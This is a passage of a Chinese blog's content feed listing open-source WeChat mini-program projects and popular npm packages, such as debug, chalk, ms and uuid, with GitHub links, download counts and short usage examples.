src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662818768021-c3192620-276c-445a-bdc4-7393f4fe32ce.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662818768021-c3192620-276c-445a-bdc4-7393f4fe32ce.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 16.2k）：</strong><a href="https://github.com/vant-ui/vant-weapp">https://github.com/vant-ui/vant-weapp</a></p><h2 id="iView-Weapp"><a href="#iView-Weapp" class="headerlink" title="iView Weapp"></a>iView Weapp</h2><p>iView Weapp 是一套高质量的微信小程序 UI 组件库。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662820006985-4c36c533-6ca2-4bbd-b9fa-2f98883508ae.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662820006985-4c36c533-6ca2-4bbd-b9fa-2f98883508ae.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 6.2k）：</strong><a href="https://github.com/TalkingData/iview-weapp">https://github.com/TalkingData/iview-weapp</a></p><h2 id="echarts-for-weixin"><a href="#echarts-for-weixin" class="headerlink" title="echarts-for-weixin"></a>echarts-for-weixin</h2><p>echarts-for-weixin 是 <a href="https://github.com/apache/incubator-echarts">Apache ECharts (incubating)</a> 的微信小程序版本，以及使用的示例。开发者可以通过熟悉的 ECharts 配置方式，快速开发图表，满足各种可视化需求。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662818180810-6f36d21b-4861-406a-84cf-bc1d802bb5bc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662818180810-6f36d21b-4861-406a-84cf-bc1d802bb5bc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 6k）：</strong><a href="https://github.com/ecomfe/echarts-for-weixin">https://github.com/ecomfe/echarts-for-weixin</a></p><h2 id="Gitter"><a href="#Gitter" class="headerlink" title="Gitter"></a>Gitter</h2><p>Gitter for GitHub，可能是目前颜值最高的 GitHub 微信小程序客户端。该项目采用 <a href="https://taro.aotu.io/">Taro</a> 框架 + <a href="https://taro-ui.aotu.io/">Taro UI</a> 进行开发，小程序内数据均来自于 <a href="https://developer.github.com/v3/">GitHub Api v3</a>。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662816022676-f0c84f97-d92c-4597-bfb1-5d144fa9f01b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662816022676-f0c84f97-d92c-4597-bfb1-5d144fa9f01b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 3.6k）：</strong><a href="https://github.com/nslogx/Gitter">https://github.com/nslogx/Gitter</a></p><h2 id="winxin-app-watch-life-net"><a href="#winxin-app-watch-life-net" class="headerlink" title="winxin-app-watch-life.net"></a>winxin-app-watch-life.net</h2><p>微慕小程序开源版-WordPress 版微信小程序，其支持分享朋友圈、微信小程序广告、文章海报、WordPress 相册、小程序直播、微信搜一搜页面接入和内容搜索、视频号、半屏打开小程序、订阅专题、页面的分享和转发、文章浏览数显示及更新、文章分、文章评论、文章排行等。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662817633215-022e8860-8882-4611-9a34-e154053ea008.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662817633215-022e8860-8882-4611-9a34-e154053ea008.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 2.3 k）：</strong><a href="https://github.com/iamxjb/winxin-app-watch-life.net">https://github.com/iamxjb/winxin-app-watch-life.net</a></p><h2 id="Bee"><a href="#Bee" class="headerlink" title="Bee"></a>Bee</h2><p>Bee 是一个餐饮点餐商城微信小程序，是针对餐饮行业推出的一套完整的餐饮解决方案，实现了用户在线点餐下单、外卖、叫号排队、支付、配送等功能，完美的使餐饮行业更高效便捷！</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662816470204-88052ef8-45a4-45ba-b406-9c06fb15b62d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662816470204-88052ef8-45a4-45ba-b406-9c06fb15b62d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 1k）：</strong><a href="https://github.com/woniudiancang/bee">https://github.com/woniudiancang/bee</a></p><h2 id="taro-music"><a href="#taro-music" class="headerlink" title="taro-music"></a>taro-music</h2><p>taro-music 是 基于 taro + taro-ui + redux + react-hooks + typescript 开发的网易云音乐小程序，taro3 已升级完毕。通过这个项目也可以帮助你快速使用 Taro 开发一个属于你自己的小程序。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662817422126-f4384fdc-173a-4ac0-bcc5-690a5c5790a7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662817422126-f4384fdc-173a-4ac0-bcc5-690a5c5790a7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 1.3k）：</strong><a href="https://github.com/lsqy/taro-music">https://github.com/lsqy/taro-music</a></p><h2 id="weapp-library"><a href="#weapp-library" class="headerlink" title="weapp-library"></a>weapp-library</h2><p>weapp-library 是一个在线借书平台微信小程序，连接读者与图书馆的借书平台、读者的图书资料库与书单系统。30+ 页面，多个可复用组件，微信小程序开发入门。提供本地 mock server 解决方案。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662817201118-9d64a585-c14e-489c-aa31-fa9fd0b4490f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662817201118-9d64a585-c14e-489c-aa31-fa9fd0b4490f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 754）：</strong><a href="https://github.com/imageslr/weapp-library">https://github.com/imageslr/weapp-library</a></p><h2 id="Garbage"><a href="#Garbage" class="headerlink" title="Garbage"></a>Garbage</h2><p>Garbage 是一个使用小程序云开发的垃圾分类小程序。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662819245320-8d77b76d-45e5-455c-bd40-992cd540c210.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662819245320-8d77b76d-45e5-455c-bd40-992cd540c210.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 736）：</strong><a href="https://github.com/qi19901212/Garbage">https://github.com/qi19901212/Garbage</a></p><h2 id="wepy"><a href="#wepy" class="headerlink" title="wepy"></a>wepy</h2><p>WePY 是一款让小程序支持组件化开发的框架，通过预编译的手段让开发者可以选择自己喜欢的开发风格去开发小程序。框架的细节优化，Promise，Async Functions 的引入都是为了能让开发小程序项目变得更加简单，高效。</p><p>其具有以下特性：<br />● 类 Vue 开发风格<br />● 支持自定义组件开发<br />● 支持引入 NPM 包<br />● 支持 Promise<br />● 支持 ES2015+ 特性，如 Async Functions<br />● 支持多种编译器，Less&#x2F;Sass&#x2F;Stylus&#x2F;PostCSS、Babel&#x2F;Typescript、Pug<br />● 支持多种插件处理，文件压缩，图片压缩，内容替换等<br />● 支持 Sourcemap，ESLint 等<br />● 小程序细节优化，如请求列队，事件优化等</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662821425314-7458e649-7a23-419d-8bed-6224088ba2f5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662821425314-7458e649-7a23-419d-8bed-6224088ba2f5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 21.9k）：</strong><a href="https://github.com/Tencent/wepy">https://github.com/Tencent/wepy</a></p><h2 id="awesome-wechat-weapp"><a href="#awesome-wechat-weapp" class="headerlink" title="awesome-wechat-weapp"></a>awesome-wechat-weapp</h2><p>微信小程序开发资源汇总，本项目收集了微信小程序开发过程中会使用到的资料、问题以及第三方组件库。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662819465650-b4f2ccf2-d251-41cf-8a3d-42a7a2374a4a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1662819465650-b4f2ccf2-d251-41cf-8a3d-42a7a2374a4a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github（⭐️ 38.7k）：</strong><a href="https://github.com/justjavac/awesome-wechat-weapp">https://github.com/justjavac/awesome-wechat-weapp</a></p><p>**贝壳小盒子<br>贝壳小盒子微信小程序，高校微信小程序，集课表查询、成绩查询、电费查询、图书查询等功能于一体。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672662190381-f5c837e5-7a25-4194-af14-bb60b7e99725.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672662190381-f5c837e5-7a25-4194-af14-bb60b7e99725.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/Airmole/ShellBox">https://github.com/Airmole/ShellBox</a></p><h2 id="校园小情书"><a href="#校园小情书" class="headerlink" title="校园小情书"></a>校园小情书</h2><p>校园小情书微信小程序，通过了前端和后端完整代码。具有表白墙、树洞、校园论坛、步数旅行、漫画脸、情侣脸、今日话题等功能。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672662273120-3589d577-d55e-465d-8092-4e21e43862c0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672662273120-3589d577-d55e-465d-8092-4e21e43862c0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/oubingbing/school_wechat">https://github.com/oubingbing/school_wechat</a></p><h2 id="租房平台"><a href="#租房平台" class="headerlink" title="租房平台"></a>租房平台</h2><p>租房平台类微信小程序，基于 Cloud Base（TCB）云开发，小程序端集成了管理后台。用户可以发布新房、二手房、租房等委托，中介机构审核发布、推荐，客户挑好房子后可以直接中介或者房源发布者，小程序带完整的管理员后台。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672662699295-2007571f-881c-447f-b7bd-76e1067efde3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672662699295-2007571f-881c-447f-b7bd-76e1067efde3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/lx164/house">https://github.com/lx164/house</a></p><h2 id="仿网易云音乐"><a href="#仿网易云音乐" class="headerlink" title="仿网易云音乐"></a>仿网易云音乐</h2><p>基于 taro + taro-ui + redux + react-hooks + typescript 开发的网易云音乐小程序，taro3 已升级完毕。项目支持用户登录、退出、关注列表、动态列表、粉丝列表、推荐歌单、推荐电台、歌词滚动、切换歌曲、喜欢音乐、搜索、视频播放等功能。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672663301128-893bd44e-642f-49b5-abd0-32c6e08c9841.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672663301128-893bd44e-642f-49b5-abd0-32c6e08c9841.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/lsqy/taro-music">https://github.com/lsqy/taro-music</a></p><h2 id="在线借书平台"><a href="#在线借书平台" class="headerlink" title="在线借书平台"></a>在线借书平台</h2><p>在线借书平台微信小程序：连接读者与图书馆的借书平台、读者的图书资料库与书单系统。30+ 页面，多个可复用组件，微信小程序开发入门。提供本地 mock server 解决方案。</p><p>除此之外，还提供了使用 Taro 重构后的版本，仅包含三个示例页面。面向人群主要是 Taro&#x2F;React&#x2F;Redux 的初学者，目的是提供一个简单的实践项目，帮助理解 Taro 与 Redux 的配合方式与 Taro 的基本使用。技术栈：Taro + Taro UI + Redux + Webpack + ES6 + Mock</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672662761238-8892eee0-db8c-421e-8b32-4061d28c3416.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672662761238-8892eee0-db8c-421e-8b32-4061d28c3416.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：<br>●</strong>普通版：**<a href="https://github.com/imageslr/weapp-library">https://github.com/imageslr/weapp-library</a><br />●**Taro 版**：<a href="https://github.com/imageslr/taro-library">https://github.com/imageslr/taro-library</a></p><h2 id="商城营销组件"><a href="#商城营销组件" class="headerlink" title="商城营销组件"></a>商城营销组件</h2><p>一套简单、易用、业务化的商城营销组件库，让开发变得更简单。其提供了大转盘、红包雨、九宫格翻牌、老虎机、微信小程序分享(转发好友&#x2F;分享图)、Tab 滚动导航、滚动数字等组件。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672663019017-514657e2-1499-4cc4-95ec-a9f274c5eaac.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672663019017-514657e2-1499-4cc4-95ec-a9f274c5eaac.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/sunniejs/sol-weapp/">https://github.com/sunniejs/sol-weapp/</a></p><h2 id="在线考试系统"><a href="#在线考试系统" class="headerlink" title="在线考试系统"></a>在线考试系统</h2><p>学之思开源考试系统是一款前后端分离的考试系统。主要优点是开发、部署简单快捷、界面设计友好、代码结构清晰。支持 web 端和微信小程序，能覆盖到 pc 机和手机等设备。 支持多种部署方式：集成部署、前后端分离部署、docker 部署。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672663608600-58af1a4a-0b2f-4208-80c2-42cb4d775512.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672663608600-58af1a4a-0b2f-4208-80c2-42cb4d775512.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/mindskip/xzs">https://github.com/mindskip/xzs</a></p><h2 id="WeHalo-博客"><a href="#WeHalo-博客" class="headerlink" title="WeHalo 博客"></a>WeHalo 博客</h2><p>WeHalo 是配合 Halo 轻快，简洁，功能强大的博客系统而开发出来的简约风 微信小程序版博客。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672663476079-aceb7751-406a-4c26-a99a-4893f5e02cc9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2023/png/1500604/1672663476079-aceb7751-406a-4c26-a99a-4893f5e02cc9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/savingrun/WeHalo">https://github.com/savingrun/WeHalo</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> 项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>热门项目</title>
      <link href="/2023/06/30/frontend/collection/projects/re-men-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/re-men-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="XIJxO"></a></p><h2 id="1-debug"><a href="#1-debug" class="headerlink" title="1. debug"></a>1. debug</h2><p>debug 是一个模仿 Node.js 核心调试技术的小型 JavaScript 调试实用程序。适用于 Node.js 和 Web 浏览器。</p><p>debug 每周下载量：<strong>195,681,684</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648828885404-4e0c0374-1f9e-4739-b84b-04ef42b5b912.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648828885404-4e0c0374-1f9e-4739-b84b-04ef42b5b912.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>GitHub</strong>：<a href="https://github.com/debug-js/debug">https://github.com/debug-js/debug</a></p><p><a name="gJRiO"></a></p><h2 id="2-chalk"><a href="#2-chalk" class="headerlink" title="2. chalk"></a>2. chalk</h2><p>chalk 是一个终端字符串美化工具。默认 node 在输出终端的文字都是黑白的，为了使输出不再单调，就可以使用这个库来添加文字背景和字体颜色。</p><p>chalk 每周下载量：<strong>180,736,619</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648829520492-24430c6e-1874-44f5-8164-0771084f8419.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648829520492-24430c6e-1874-44f5-8164-0771084f8419.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/chalk/chalk">https://github.com/chalk/chalk</a></p><p><a name="WMKwK"></a></p><h2 id="3-ms"><a href="#3-ms" class="headerlink" title="3. ms"></a>3. ms</h2><p>ms 是一个微小的毫秒转换实用程序，可以轻松地将各种时间格式转换为毫秒。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;2 days&quot;</span>); <span class="comment">// 172800000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;1d&quot;</span>); <span class="comment">// 86400000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;10h&quot;</span>); <span class="comment">// 36000000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;2.5 hrs&quot;</span>); <span class="comment">// 9000000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;2h&quot;</span>); <span class="comment">// 7200000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;1m&quot;</span>); <span class="comment">// 60000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;5s&quot;</span>); <span class="comment">// 5000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;1y&quot;</span>); <span class="comment">// 31557600000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;100&quot;</span>); <span class="comment">// 100</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;-3 days&quot;</span>); <span class="comment">// -259200000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;-1h&quot;</span>); <span class="comment">// -3600000</span></span><br><span class="line"><span class="title function_">ms</span>(<span class="string">&quot;-200&quot;</span>); <span class="comment">// -200</span></span><br></pre></td></tr></table></figure><p>ms 每周下载量：<strong>162,813,087</strong><br /><strong>GitHub：</strong><a href="https://github.com/vercel/ms">https://github.com/vercel/ms</a></p><p><a name="bItCu"></a></p><h2 id="4-strip-ansi"><a href="#4-strip-ansi" class="headerlink" title="4. strip-ansi"></a>4. strip-ansi</h2><p>strip-ansi 用于从字符串中去掉 ANSI 转义码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> stripAnsi <span class="keyword">from</span> <span class="string">&quot;strip-ansi&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">stripAnsi</span>(<span class="string">&quot;\u001B[4mUnicorn\u001B[0m&quot;</span>); <span class="comment">//=&gt; &#x27;Unicorn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">stripAnsi</span>(<span class="string">&quot;\u001B]8;;https://github.com\u0007Click\u001B]8;;\u0007&quot;</span>); <span class="comment">//=&gt; &#x27;Click&#x27;</span></span><br></pre></td></tr></table></figure><p>strip-ansi 每周下载量：<strong>123,800,769</strong><br /><strong>GitHub：</strong><a href="https://github.com/chalk/strip-ansi">https://github.com/chalk/strip-ansi</a></p><p><a name="dwwVE"></a></p><h2 id="5-Commander"><a href="#5-Commander" class="headerlink" title="5. Commander"></a>5. Commander</h2><p>Commander.js 是 Node.js 命令行接口的补全解决方案，灵感来源于 Ruby 的 commander。它使得命令行界面变得简单。</p><p>Commander 每周下载量：<strong>90,841,947</strong></p><p><strong>GitHub：</strong><a href="https://github.com/tj/commander.js">https://github.com/tj/commander.js</a></p><p><a name="blppe"></a></p><h2 id="6-yargs"><a href="#6-yargs" class="headerlink" title="6. yargs"></a>6. yargs</h2><p>Yargs 框架通过使用 Node.js 构建功能全面的命令行应用，它能轻松配置命令，解析多个参数，并设置快捷方式等，还能自动生成帮助菜单。</p><p>yargs 每周下载量：<strong>79,505,865</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648830706613-d2f26de9-26fd-4c56-939a-c41fa736d24d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1648830706613-d2f26de9-26fd-4c56-939a-c41fa736d24d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/yargs/yargs">https://github.com/yargs/yargs</a></p><p><a name="LxQ0R"></a></p><h2 id="7-uuid"><a href="#7-uuid" class="headerlink" title="7. uuid"></a>7. uuid</h2><p>uuid 用于在 JavaScript 中生成符合 RFC4122 的 UUID。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; v4 <span class="keyword">as</span> uuidv4 &#125; <span class="keyword">from</span> <span class="string">&quot;uuid&quot;</span>;</span><br><span class="line"><span class="title function_">uuidv4</span>(); <span class="comment">// ⇨ &#x27;9b1deb4d-3b7d-4bad-9bdd-2b0d7b3dcb6d&#x27;</span></span><br></pre></td></tr></table></figure><p><br />uuid 每周下载量：<strong>76,317,814</strong><br /><strong>GitHub：</strong><a href="https://github.com/uuidjs/uuid">https://github.com/uuidjs/uuid</a></p><p><a name="hPSXn"></a></p><h2 id="8-p-limit"><a href="#8-p-limit" class="headerlink" title="8. p-limit"></a>8. p-limit</h2><p>p-limit 用于有限的并发运行多个 promise-returning &amp; async 函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> input = [</span><br><span class="line">  <span class="title function_">limit</span>(<span class="function">() =&gt;</span> <span class="title function_">fetchSomething</span>(<span class="string">&quot;foo&quot;</span>)),</span><br><span class="line">  <span class="title function_">limit</span>(<span class="function">() =&gt;</span> <span class="title function_">fetchSomething</span>(<span class="string">&quot;bar&quot;</span>)),</span><br><span class="line">  <span class="title function_">limit</span>(<span class="function">() =&gt;</span> <span class="title function_">doSomething</span>()),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only one promise is run at once</span></span><br><span class="line"><span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(input);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br></pre></td></tr></table></figure><p><br />p-limit 每周下载量：<strong>75,841,698</strong><br /><strong>GitHub：</strong><a href="https://github.com/sindresorhus/p-limit">https://github.com/sindresorhus/p-limit</a></p><p><a 